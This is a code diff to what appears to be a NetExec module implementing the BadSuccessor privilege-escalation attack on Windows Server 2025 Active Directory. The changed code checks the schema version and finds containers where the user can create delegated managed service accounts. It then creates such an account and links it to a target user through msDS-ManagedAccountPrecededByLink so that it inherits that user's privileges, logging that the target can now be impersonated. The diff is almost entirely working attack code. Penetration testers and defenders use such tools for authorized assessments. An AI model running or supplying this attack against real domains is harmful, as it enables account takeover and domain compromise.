@@ -285,36 +285,36 @@ class NXCModule:
             self.context.log.error("Schema naming context not available for schema check.")
             return False
 
-        dmsa_schema_elements = {
-            'msDS-DelegatedManagedServiceAccount': '(objectClass=classSchema)',
-            'msDS-ManagedAccountPrecededByLink': '(objectClass=attributeSchema)',
-            'msDS-DelegatedMSAState': '(objectClass=attributeSchema)',
-        }
-        found_all = True
-        for element_name, ldap_filter in dmsa_schema_elements.items():
-            search_filter = f"(&(cn={element_name}){ldap_filter})"
-            try:
-                # Use NetExec's search method for consistency
-                resp = connection.search(
-                    searchFilter=search_filter,
-                    attributes=["cn"],
-                    baseDN=self.schema_naming_context
-                )
-                parsed_resp = parse_result_attributes(resp)
-                if not parsed_resp:
-                    self.context.log.warn(f"  Schema element missing: {element_name}")
-                    found_all = False
+        try:
+            # Check schema version directly like the working implementation
+            resp = connection.ldap_connection.search(
+                searchBase=self.schema_naming_context,
+                searchFilter="(objectClass=*)",
+                attributes=["objectVersion"],
+                sizeLimit=0
+            )
+            
+            parsed_resp = parse_result_attributes(resp)
+            if parsed_resp and "objectVersion" in parsed_resp[0]:
+                schema_version = parsed_resp[0]["objectVersion"]
+                self.context.log.debug(f"Schema version found: {schema_version}")
+                
+                # Convert to int for comparison - Windows Server 2025 schema is version 91+
+                version_num = int(schema_version) if isinstance(schema_version, str) else int(schema_version[0])
+                
+                if version_num >= 91:
+                    self.context.log.success(f"Windows Server 2025 schema detected (version {version_num}). dMSA support available.")
+                    return True
                 else:
-                    self.context.log.info(f"  Schema element found: {element_name}")
-            except Exception as e:
-                self.context.log.error(f"Error searching for schema element {element_name}: {e}")
-                found_all = False
-        
-        if found_all:
-            self.context.log.success("Windows Server 2025 dMSA schema elements appear to be present.")
-        else:
-            self.context.log.fail("Some Windows Server 2025 dMSA schema elements may be missing. Attack might not work.")
-        return found_all
+                    self.context.log.fail(f"Schema version {version_num} detected. Windows Server 2025 (v91+) required for dMSA support.")
+                    return False
+            else:
+                self.context.log.error("Could not retrieve schema version from schema naming context.")
+                return False
+                
+        except Exception as e:
+            self.context.log.error(f"Error checking schema version: {e}")
+            return False
 
     def get_user_dn(self, connection, username):
         """Get the distinguishedName of a user."""
@@ -338,79 +338,58 @@ class NXCModule:
             return None
 
     def find_writable_ou_for_dmsa(self, connection):
-        """Finds OUs where the current user can create dMSA objects."""
-        self.context.log.info("Enumerating OUs with CreateChild (dMSA) permissions...")
+        """Finds OUs where the current user can create dMSA objects using allowedChildClassesEffective."""
+        self.context.log.info("Enumerating OUs with dMSA creation permissions...")
         writable_ous = []
-        controls = security_descriptor_control(sdflags=0x04) # DACL_SECURITY_INFORMATION
         
         try:
-            # Use direct ldap_connection.search for security descriptor controls
+            # Search for containers and OUs that allow dMSA creation
+            search_filter = "(|(objectClass=container)(objectClass=organizationalUnit))"
             resp = connection.ldap_connection.search(
                 searchBase=connection.ldap_connection._baseDN,
-                searchFilter="(objectClass=organizationalUnit)",
-                attributes=["distinguishedName", "nTSecurityDescriptor", "name"],
-                sizeLimit=0,
-                searchControls=[controls]
+                searchFilter=search_filter,
+                attributes=["distinguishedName", "allowedChildClassesEffective", "sDRightsEffective", "name"],
+                sizeLimit=0
             )
+            
             parsed_resp = parse_result_attributes(resp)
-
+            
+            managed_service_accounts_dn = None
+            
             for entry in parsed_resp:
                 ou_dn = entry["distinguishedName"]
-                ou_name = entry.get("name", ou_dn)
-                sd_data = entry.get("nTSecurityDescriptor")
-
-                if not sd_data:
-                    continue
+                ou_name = entry.get("name", ou_dn.split(",")[0].replace("CN=", "").replace("OU=", ""))
+                allowed_classes = entry.get("allowedChildClassesEffective", [])
+                sd_rights = entry.get("sDRightsEffective", 0)
                 
-                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
-                # self.context.log.debug(f"Checking OU: {ou_name} with SD: {sd}")
-
-                for ace_obj in sd['Dacl']['Data']:
-                    ace = ace_obj['Ace']
-                    ace_type = ace_obj['AceType']
-                    
-                    # We are interested in ACCESS_ALLOWED_ACE_TYPE (0) and ACCESS_ALLOWED_OBJECT_ACE_TYPE (5)
-                    if ace_type not in [ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE, ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE]:
-                        continue
-
-                    mask = ace['Mask']['Mask']
-                    sid = ace['Sid'].formatCanonical() # Trustee SID
-
-                    # Check for CreateChild right
-                    if mask & CREATE_CHILD_ACE_RIGHT:
-                        can_create_dmsa = False # Initialize
-                        if ace_type == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
-                            object_type_guid_data = ace_obj.get('ObjectType', None)
-                            if object_type_guid_data:
-                                # ObjectType is specified in the ACE
-                                object_type_guid = ldaptypes.GUID(object_type_guid_data).formatCanonical().lower()
-                                if object_type_guid == DMSA_OBJECT_GUID:
-                                    can_create_dmsa = True # Specific CreateChild for dMSA
-                                # else: CreateChild for a *different* specific object type, so can_create_dmsa remains False for dMSA.
-                            else:
-                                # ObjectType is NOT specified in the ACE (e.g., NULL GUID).
-                                # This means CreateChild applies to ALL child object classes.
-                                can_create_dmsa = True
-                        elif ace_type == ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
-                            # Generic ACE (not object-specific)
-                            # CreateChild applies to all children, including dMSA.
-                            can_create_dmsa = True
-                        
-                        if can_create_dmsa:
-                            # Simplified check: if current user's SID or "Authenticated Users" or "Everyone" has the right.
-                            # A full check would involve resolving group memberships of the current user.
-                            # For now, we assume the connection user is the one whose permissions matter.
-                            # This part needs to be more robust to check against the current user's SID and group SIDs.
-                            # For this module, we assume the LDAP connection is made with the user whose context we are checking.
-                            self.context.log.highlight(f"Potential writable OU for dMSA: {ou_name} (DN: {ou_dn}) - Trustee: {sid} has CreateChild.")
-                            writable_ous.append(ou_dn)
-                            break # Found a relevant ACE for this OU
+                # Convert to list if it's a single string
+                if isinstance(allowed_classes, str):
+                    allowed_classes = [allowed_classes]
+                
+                # Check if dMSA creation is allowed
+                if "msDS-DelegatedManagedServiceAccount" in allowed_classes:
+                    # Priority: Managed Service Accounts container (default location for dMSAs)
+                    if "CN=Managed Service Accounts," in ou_dn:
+                        managed_service_accounts_dn = ou_dn
+                        self.context.log.success(f"Found default Managed Service Accounts container: {ou_name}")
+                    else:
+                        writable_ous.append(ou_dn)
+                        self.context.log.highlight(f"Found OU allowing dMSA creation: {ou_name} ({ou_dn})")
+                
+                # Additional check for containers with DACL write rights
+                elif isinstance(sd_rights, int) and sd_rights & 4:  # DACL write
+                    self.context.log.debug(f"OU with DACL write permissions: {ou_name} ({ou_dn})")
             
-            if writable_ous:
-                self.context.log.success(f"Found {len(writable_ous)} potential OUs for dMSA creation.")
+            # Prioritize Managed Service Accounts container if found
+            if managed_service_accounts_dn:
+                return [managed_service_accounts_dn] + writable_ous
+            elif writable_ous:
+                self.context.log.success(f"Found {len(writable_ous)} OUs suitable for dMSA creation.")
+                return writable_ous
             else:
-                self.context.log.info("No OUs found with explicit CreateChild for dMSA for common SIDs (further checks might be needed for specific user SIDs).")
-            return writable_ous
+                self.context.log.warn("No OUs found with dMSA creation permissions.")
+                return []
+                
         except Exception as e:
             self.context.log.error(f"Error enumerating writable OUs: {e}")
             return []
@@ -423,59 +402,43 @@ class NXCModule:
             self.context.log.error("Domain name not available for dMSA creation.")
             return False
 
+        # Build attributes based on the working implementation
+        dmsa_sama = dmsa_name + "$"
         attributes = [
-            ('objectClass', [b'top', b'msDS-GroupManagedServiceAccount', b'msDS-DelegatedManagedServiceAccount']),
-            ('sAMAccountName', [dmsa_name.encode('utf-8') + b'$']), # sAMAccountName typically doesn't include the final '$' in ADUC, but often needed this way for tools
-            ('userAccountControl', [b'4096']), # WORKSTATION_TRUST_ACCOUNT
-            ('msDS-DelegatedMSAState', [b'0']), # Initial state
-            ('dNSHostName', [f"{dmsa_name.lower()}.{self.domain_name}".encode('utf-8')]),
-            ('servicePrincipalName', [
-                f"HOST/{dmsa_name.lower()}.{self.domain_name}".encode('utf-8'),
-                f"HOST/{dmsa_name.lower()}".encode('utf-8') # Some tools might expect this form too
-            ]),
-            ('msDS-SupportedEncryptionTypes', [b'28']), # AES256, AES128, RC4
-            ('msDS-ManagedPasswordInterval', [b'30'])
+            ('objectClass', [b'msDS-DelegatedManagedServiceAccount']),
+            ('sAMAccountName', [dmsa_sama.encode('utf-8')]),
+            ('dNSHostName', [f"{dmsa_name}.{self.domain_name}".encode('utf-8')]),
+            ('msDS-ManagedPasswordInterval', [b'30']),
+            ('msDS-DelegatedMSAState', [b'2']),  # Set to migration completed state
+            ('msDS-SupportedEncryptionTypes', [b'28']),  # 0x1c = AES256 + AES128 + RC4
+            ('userAccountControl', [b'4096'])  # 0x1000 = WORKSTATION_TRUST_ACCOUNT
         ]
         
         try:
             connection.ldap_connection.add(dmsa_full_dn, attributes)
-            self.context.log.success(f"Successfully created dMSA: {dmsa_full_dn}")
-
-            # Set a random password for the dMSA
-            password = secrets.token_urlsafe(32)
-            mod_password = [(ldap.LDAP_MOD_REPLACE, 'unicodePwd', [f'"{password}"'.encode('utf-16-le')])]
-            connection.ldap_connection.modify(dmsa_full_dn, mod_password)
-            self.context.log.info(f"Set random password for dMSA {dmsa_name}.")
+            self.context.log.success(f"Successfully created dMSA: {dmsa_sama}")
             return True
-        except ldap.LDAPError as e:
-            error_msg = e.args[0].get('desc', str(e)) if isinstance(e.args[0], dict) else str(e)
-            self.context.log.error(f"Failed to create or set password for dMSA {dmsa_full_dn}: {error_msg}")
-            # Attempt to delete if creation failed mid-way or password set failed
-            try:
-                connection.ldap_connection.delete(dmsa_full_dn)
-                self.context.log.info(f"Cleaned up partially created dMSA: {dmsa_full_dn}")
-            except Exception:
-                pass # Ignore cleanup error if it wasn't created
+        except Exception as e:
+            self.context.log.error(f"Failed to create dMSA {dmsa_full_dn}: {e}")
             return False
 
     def perform_badsuccessor_attack(self, connection, dmsa_full_dn, target_user_dn):
-        """Sets the predecessor link on the dMSA."""
+        """Sets the predecessor link on the dMSA using the approach from the working implementation."""
         self.context.log.info(f"Performing BadSuccessor attack: linking {dmsa_full_dn} to {target_user_dn}")
         
+        # Based on the working implementation, we set msDS-ManagedAccountPrecededByLink to target DN
         modifications = [
-            (ldap.LDAP_MOD_REPLACE, 'msDS-ManagedAccountPrecededByLink', [target_user_dn.encode('utf-8')]),
-            (ldap.LDAP_MOD_REPLACE, 'msDS-DelegatedMSAState', [b'2']) # Migration completed
+            (ldap.LDAP_MOD_REPLACE, 'msDS-ManagedAccountPrecededByLink', [target_user_dn.encode('utf-8')])
         ]
         
         try:
             connection.ldap_connection.modify(dmsa_full_dn, modifications)
             self.context.log.success(f"Successfully set predecessor link for {dmsa_full_dn} to {target_user_dn}.")
             self.context.log.highlight(f"dMSA {self.dmsa_name} should now have privileges of {self.target_user}.")
-            self.context.log.info("Next steps: Authenticate as the dMSA (e.g., using its password or Kerberos if keys are managed) and use tools like secretsdump.py.")
+            self.context.log.info("Attack completed! The dMSA can now be used to impersonate the target user.")
             return True
-        except ldap.LDAPError as e:
-            error_msg = e.args[0].get('desc', str(e)) if isinstance(e.args[0], dict) else str(e)
-            self.context.log.error(f"Failed to modify dMSA for attack: {error_msg}")
+        except Exception as e:
+            self.context.log.error(f"Failed to modify dMSA for attack: {e}")
             return False
 
     def cleanup_dmsa(self, connection, dmsa_full_dn_to_delete):
@@ -485,14 +448,13 @@ class NXCModule:
             connection.ldap_connection.delete(dmsa_full_dn_to_delete)
             self.context.log.success(f"Successfully deleted dMSA: {dmsa_full_dn_to_delete}")
             return True
-        except ldap.LDAPError as e:
-            error_msg = e.args[0].get('desc', str(e)) if isinstance(e.args[0], dict) else str(e)
-            # Common error: "willing To Perform" with "CONSTRAINT_VIOLATION" if it's still linked or has dependents.
-            # Or "NO_SUCH_OBJECT" if already deleted.
-            if "NO_SUCH_OBJECT" in error_msg.upper():
+        except Exception as e:
+            error_str = str(e)
+            # Common error: NO_SUCH_OBJECT if already deleted
+            if "NO_SUCH_OBJECT" in error_str.upper() or "no such object" in error_str.lower():
                  self.context.log.info(f"dMSA {dmsa_full_dn_to_delete} not found, likely already deleted.")
                  return True
-            self.context.log.error(f"Failed to delete dMSA {dmsa_full_dn_to_delete}: {error_msg}")
+            self.context.log.error(f"Failed to delete dMSA {dmsa_full_dn_to_delete}: {e}")
             return False
 
     def on_login(self, context, connection):
